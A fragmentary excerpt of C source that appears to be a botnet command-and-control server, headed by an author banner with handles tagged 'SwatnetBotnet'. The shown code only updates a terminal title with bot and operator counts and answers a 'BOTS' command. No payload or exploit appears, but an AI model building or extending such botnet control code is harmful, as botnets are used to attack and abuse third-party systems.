...
Skype: live:derekj1017 #SwatnetBotnet #MonsterSecurity #CEFOwner ~ILLSeC~
Discord: Derek ~ILLSeC~#4885
Twitter: @SwatnetBotnet1
Build Date: 6/20/17
*/
/*
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0;Bot Count: %d| Users Connected: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007');
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		{
			if(strstr(buf, "BOTS")) {
				sprintf(botcount, "Bot Count: %d | Users Connected: %d\r\n", BotsConnected(), OperatorsConnected);
